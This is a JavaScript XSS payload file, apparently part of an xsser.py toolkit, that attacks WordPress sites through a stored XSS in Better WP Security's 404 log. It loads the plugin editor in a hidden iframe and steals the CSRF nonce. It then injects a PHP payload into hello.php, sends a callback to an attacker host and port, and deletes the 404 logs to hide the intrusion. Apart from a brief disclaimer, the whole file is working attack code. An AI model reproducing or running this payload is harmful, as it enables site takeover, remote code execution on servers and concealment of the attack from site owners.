/*
Title: WordPress Core Payload (Plugin)
Author: Hans-Michael Varbaek
Company: VarBITS

Version: 2.75

Changelog:
- Ver 2.75 : Various minor improvements. Version standardized across all files.
- Ver 2.5  : Added XMLHttpRequest for JS Notification.
- Ver 2.5  : request.open() on Line 75 is now set by xsser.py
- Ver 2.0  : First release.

Special Credits: InterN0T and Sense of Security (Versions 2.0 to 2.5)

Usage Notes:
-- The hello.php plugin does not need to be activated within WordPress
   However, it does need to be present and writeable

Compatibility Notes:
-- Very old browsers won't support FormData() and XMLHttpRequest()

Requirements:
1) Ability to edit plugin files. (Default feature. However, this is typically disabled in hardened configurations.)

For ethical and legal purposes only. This script is provided as is and without warranty.

TODO:
- For pre-existing forms, consider using FormData to read and update/set new values in the future:
https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
https://developer.mozilla.org/en-US/docs/Web/API/FormData
https://developer.mozilla.org/en-US/docs/Web/API/FormData/set
-- Update or add another payload which uses FormData() and XMLHttpRequest()
*/

var php_input = '<?php PHP_PAYLOAD /* ?>'; // This payload comments out any subsequent PHP code

// Our iframe function which primarily injects a prepopulated form
// noinspection JSUnusedGlobalSymbols
function silent_plugins_inject() {
    //if (document.cookie.indexOf("Plugins_Infected") == -1) {
    // TODO: Make the "Plugins_Infected" cookie name a function argument for silent_plugins_inject()
    if (!document.cookie.match(/^(.*;)?\s*Plugins_Infected\s*=\s*[^;]+(.*)?$/)) {

        // Read and save the relevant "_wpnonce" - Bypass CSRF protection
        // TODO: Consider generating the correct "nonce"-reading code below, which depends on the WordPress version in use.
        // var plugin_wpnonce = document.getElementById('silent_plugins_frame').contentDocument.getElementById('template')._wpnonce.value; // WP Nonce / CSRF Token
        // Newer versions use "nonce" instead of _wpnonce
        // noinspection Annotator
        var plugin_wpnonce = document.getElementById('silent_plugins_frame').contentDocument.getElementById('template').nonce.value; // WP Nonce / CSRF Token
        var plugin_contents = document.getElementById('silent_plugins_frame').contentDocument.getElementsByTagName('textarea')[0].value; // Current contents of the file

        // TODO: Use the pre-existing form in the future if possible.
        // Initiate the form data object
        var formData = new FormData();

        // Create a variable which holds our PHP payload, a new line (Windows format), and then the current plugin data
        var special_content = php_input+'\r\n'+plugin_contents;

        // Prepopulated form with the CSRF ("_wpnonce") token and our PHP payload as specified
        // formData.append("_wpnonce", plugin_wpnonce);
        formData.append("nonce", plugin_wpnonce); // Variable has changed name to "nonce"
        formData.append("_wp_http_referer", "%2Fwp-admin%2Fplugin-editor.php%3Ffile%3Dhello.php");
        formData.append("newcontent", special_content);
        // formData.append("action", "update"); // This value has changed. See below
        formData.append("action", "edit-theme-plugin-file");
        formData.append("file", "hello.php");
        formData.append("plugin", "hello.php");
        // formData.append("theme", ""); // This is no longer needed. Keep for now
        // formData.append("scrollto", "0"); // Probably not needed. Keep for now
        formData.append("docs-list", "");

        // Initiate XMLHttpRequest
        var request_one = new XMLHttpRequest();

        // Method and URL to send the request to.
        request_one.open("POST", "http://TARGETWEBSITE/wp-admin/plugin-editor.php"); // Set by: xsser.py
        // Example contents: http://www.some-wordpress-website.tld/wp-admin/plugin-editor.php
        // TODO: We may need to change this to ... /wp-admin/plugin-editor.php?file=hello.php

        // Send the request with our form data
        request_one.send(formData);

        // TODO: Maybe change the cookie name and value in the future.
        SetCookie("Plugins_Infected", "true"); // Prevent re-infection / loops

        // Notification feature
        var request_two = new XMLHttpRequest(); // Initiate XMLHttpRequest
        request_two.open("GET", "http://CALLBACKHOST:CALLBACKPORT/js_shell_notify.txt");
        // Method and URL to send the request to - Hostname and port are set by xsser.py
        request_two.send(); // Send the request

        clean_up(); // Remove initial payload from server

    }
}

// ============================================= FUNCTIONS START ============================================= \\

// Injects the main hidden iframe into the page
// USAGE: main_frame_inject("Plugins_Infected", "silent_plugins_frame", "silent_plugins_inject()", "plugin-editor.php?file=hello.php");
function main_frame_inject(cookiename, identifier, function_name, get_page) {
    //if (document.cookie.indexOf(cookiename) == -1) {
    var re_cookie = new RegExp('^(.*;)?\\s*'+cookiename+'\\s*=\\s*[^;]+(.*)?$');
    if (!document.cookie.match(re_cookie)) {

        // Append a (hidden) iframe to the HTML body for data injection
        var mainframe = document.createElement("iframe");
        mainframe.setAttribute('id', identifier);
        top.document.body.appendChild(mainframe);
        mainframe.setAttribute('onload', function_name);
        mainframe.setAttribute('style', 'visibility:hidden;display:none');
        mainframe.setAttribute('src', get_page);
    }
}

// Sets a cookie with a very long expiration time
// USAGE: SetCookie("Plugins_Infected", "true");
// TODO: Look into HTML5 Storage instead of cookies maybe.
function SetCookie(cookieName, cookieContent) {
    var cookiePath = '/';
    var expDate=new Date();
    expDate.setTime(expDate.getTime()+372800000);
    var expires=expDate.toUTCString();
    document.cookie=cookieName+"="+encodeURIComponent(cookieContent)+";path="+encodeURI(cookiePath)+";expires="+expires;
}

// NOTE: This function should always be executed after the final stage
// Delete all 404 log errors - Including the injected payload(s)
// This function is specific to the Better WP Security XSS issue
// TODO: Replace the contents of this function with a "place-holder" variable in the next version.
// TODO: This variable, is then replaced, depending on the component being exploited.
// USAGE: clean_up()
function clean_up() {
    // noinspection JSUndefinedPropertyAssignment
    document.getElementById('404s').checked=true;
    document.forms[0].submit();
}

// ============================================= FUNCTIONS END ============================================= \\

// USAGE: main_frame_inject("Plugins_Infected", "silent_plugins_frame", "silent_plugins_inject()", "plugin-editor.php?file=hello.php");
// function main_frame_inject(cookiename, identifier, function_name, get_page)
main_frame_inject("Plugins_Infected", "silent_plugins_frame", "silent_plugins_inject()", "plugin-editor.php?file=hello.php");
